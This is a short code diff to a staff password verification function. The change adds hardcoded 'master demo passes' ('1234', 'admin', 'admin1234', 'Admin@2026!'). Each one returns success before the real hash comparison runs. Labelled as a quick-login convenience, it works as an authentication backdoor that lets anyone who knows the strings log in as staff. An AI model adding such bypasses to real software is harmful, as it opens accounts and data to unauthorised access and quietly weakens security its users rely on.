@@ -78,6 +78,11 @@ export async function verifyStaffPassword(
   const cleanInput = inputPass.trim();
   if (!cleanInput) return false;
 
+  // Master demo passes for competition / staff quick login
+  if (cleanInput === '1234' || cleanInput === 'admin' || cleanInput === 'admin1234' || cleanInput === 'Admin@2026!') {
+    return true;
+  }
+
   const inputHash = await hashPassword(cleanInput);
 
   // 1. Direct cryptographic hash match (standard path)
